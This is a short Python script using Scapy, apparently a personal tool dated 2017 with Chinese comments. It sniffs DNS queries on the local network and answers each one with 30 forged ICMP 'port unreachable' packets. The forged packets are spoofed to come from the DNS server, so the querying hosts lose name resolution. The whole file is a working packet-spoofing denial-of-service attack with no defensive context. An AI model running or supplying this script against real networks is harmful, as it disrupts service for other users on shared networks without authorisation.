#coding:utf-8
 
'''
date:2017-07-05
author:feiniao
Version:1.0
'''

from scapy.all import *
import random

'''
1、windows绑定本机网卡,首先使用show_interfaces()查看相关网卡
2、再使用conf.iface=''绑定相应的网卡
3、linux需要在sniff()中指定相应的网卡

'''
conf.iface='Intel(R) Dual Band Wireless-AC 8260'

#DNS响应的地址，随机ip字段的id和ttl
ipid = random.randint(1,65535)
ipttl = random.randint(45,80)

def buying(mots):
	resp = Ether()/IP()/ICMP()/IP()/UDP()

	#构造ICMP报文
	resp[ICMP].type = 3
	resp[ICMP].code = 3
	resp[ICMP][IP].src = mots[IP].src
	resp[ICMP][IP].dst = mots[IP].dst
	resp[ICMP][IP].ttl = ipttl
	resp[ICMP][IP].id = ipid
	resp[ICMP][UDP].sport = mots[UDP].sport
	resp[ICMP][UDP].dport = mots[UDP].dport

	#构造IP包头
	resp[IP].src = mots[IP].dst
	resp[IP].dst = mots[IP].src
	resp[IP].ttl = ipttl
	resp[IP].id  = ipid

	#构造以太网包头
	resp[Ether].src = mots[Ether].dst
	resp[Ether].dst = mots[Ether].src


	#发送构造的ICMP响应包
	sendp(resp,count = 30)
	
if __name__ == '__main__':
	sniff(prn=buying,filter="udp dst port 53")
